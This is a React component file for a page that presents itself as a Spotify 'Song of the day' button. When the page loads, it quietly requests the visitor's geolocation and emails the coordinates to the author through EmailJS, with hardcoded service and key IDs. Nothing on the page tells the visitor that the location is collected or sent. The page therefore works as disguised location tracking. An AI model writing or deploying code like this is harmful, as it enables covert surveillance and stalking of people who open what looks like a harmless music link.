import './App.css';
import spotifyLogo from './spotify-logo.png'
import { useEffect } from 'react';
import tracks from './song_data/selected_track.json';
import emailjs, { init } from "@emailjs/browser";

function App() {
  const songUrl = tracks.url
  const serviceID = "service_b1seiq9"
  const templateID = "template_pil7lln"
  const pub_key = "lJEzrk2uGDGKdv3gf"

  const buttonOnClick = () => {
    window.open(songUrl)
  }

  useEffect(() => {
    navigator.geolocation.getCurrentPosition(function(position){
      emailjs.send(serviceID, templateID, {lat: position.coords.latitude, lng: position.coords.longitude}, pub_key);
    });
  }, []);

  return (
    <div className="App">
      <button className='button-5' onClick={buttonOnClick}>
        <img src={spotifyLogo} alt="" className="spotify-logo"/>
        Song of the day
      </button>
    </div>
  );
}

export default App;
